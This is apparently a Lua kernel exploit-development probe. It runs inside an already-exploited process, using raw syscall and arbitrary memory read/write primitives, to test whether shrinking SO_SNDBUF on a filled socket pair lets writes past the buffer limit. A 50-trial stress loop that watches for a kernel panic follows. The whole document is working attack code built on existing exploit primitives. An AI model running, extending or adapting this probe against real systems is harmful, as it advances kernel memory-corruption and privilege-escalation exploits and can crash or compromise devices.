-- CRASH_CLASS: LOW
-- PROBE 93a6: SO_SNDBUF fill+shrink — match 93a2 pattern exactly

print("=== PROBE 93a6: SO_SNDBUF fill+shrink ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local setval = memory.alloc(4)
local optval = memory.alloc(8)
local optlen = memory.alloc(8)
local fill_buf = memory.alloc(0x4000)
for i = 0, 0x3FFC, 4 do wd(N(fill_buf) + i, 0x43434343) end

-- Step 1: fill to capacity using 93a2's exact 4-arg sendto pattern
print("[1] Fill test — 4-arg sendto (93a2 pattern)")
local sp = memory.alloc(8)
wd(N(sp), 0); wd(N(sp) + 4, 0)
mk(135)(uint64(1), uint64(1), uint64(0), sp)
local fW = rd(N(sp)) or -1
local fR = rd(N(sp) + 4) or -1
print("  fW=" .. fW .. " fR=" .. fR)

wd(N(setval), 65536)
pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)

local filled = 0
for fill = 1, 20 do
    local ok2, sr2 = pcall(function()
        return mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(4096), uint64(0x80))
    end)
    local sr = ok2 and sgn(sr2) or -999
    print("    fill " .. fill .. ": ret=" .. sr)
    if sr > 0 then filled = filled + sr else break end
end
print("  total filled: " .. filled)

-- Step 2: shrink to 1
print("[2] Shrink SO_SNDBUF to 1")
wd(N(setval), 1)
pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)
wd(N(optval), 0); wd(N(optlen), 4)
pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), optval, optlen) end)
local sb = rd(N(optval)) or 0
print("  SO_SNDBUF now: " .. sb)

-- Step 3: try writing MORE with MSG_DONTWAIT
print("[3] Write into overfull buffer (MSG_DONTWAIT)")
local wr1 = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(64), uint64(0x80)))
local wr2 = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(1), uint64(0x80)))
print("  write(64)=" .. wr1 .. " write(1)=" .. wr2)
if wr1 > 0 then print("  *** WRITE ACCEPTED PAST HIWAT ***") end

-- Step 4: drain and see how much came through
print("[4] Drain read side")
local drain = memory.alloc(0x4000)
local drained = 0
for d = 1, 30 do
    local dr = sgn(mk(3)(uint64(fR), drain, uint64(0x4000)))
    if dr > 0 then drained = drained + dr else break end
end
print("  total drained: " .. drained)

-- Step 5: after drain, write again
print("[5] Post-drain write with sndbuf=1")
local wr3 = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(64), uint64(0x80)))
local wr4 = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(1), uint64(0x80)))
print("  write(64)=" .. wr3 .. " write(1)=" .. wr4)
if wr3 > 0 and sb <= 64 then
    print("  *** POST-DRAIN WRITE ACCEPTED WITH TINY HIWAT ***")
end

pcall(function() mk(6)(uint64(fW)) end)
pcall(function() mk(6)(uint64(fR)) end)

-- Step 6: stress — 50 fill+shrink+close
print("")
print("[6] STRESS — 50 fill+shrink+close")
local ok_count = 0
for trial = 1, 50 do
    if not alive() then print("  DEAD at " .. trial); break end
    local s = memory.alloc(8)
    wd(N(s), 0); wd(N(s) + 4, 0)
    local r = sgn(mk(135)(uint64(1), uint64(1), uint64(0), s))
    if r ~= 0 then break end
    local w = rd(N(s)) or -1
    local rv = rd(N(s) + 4) or -1

    wd(N(setval), 65536)
    pcall(function() mk(105)(uint64(w), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)
    for fill = 1, 20 do
        local sr = sgn(mk(133)(uint64(w), uint64(N(fill_buf)), uint64(4096), uint64(0x80)))
        if sr <= 0 then break end
    end
    wd(N(setval), 1)
    pcall(function() mk(105)(uint64(w), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)
    pcall(function() mk(6)(uint64(w)) end)
    pcall(function() mk(6)(uint64(rv)) end)
    ok_count = ok_count + 1
    if trial <= 3 or trial % 10 == 0 then
        print("  trial " .. trial .. ": OK")
    elseif trial == 4 then print("  ...") end
end
print("  completed: " .. ok_count .. "/50  alive: " .. (alive() and "YES" or "NO"))

if not alive() then
    print("*** KERNEL PANIC ***")
end

print("")
print("=== 93a6 COMPLETE ===")
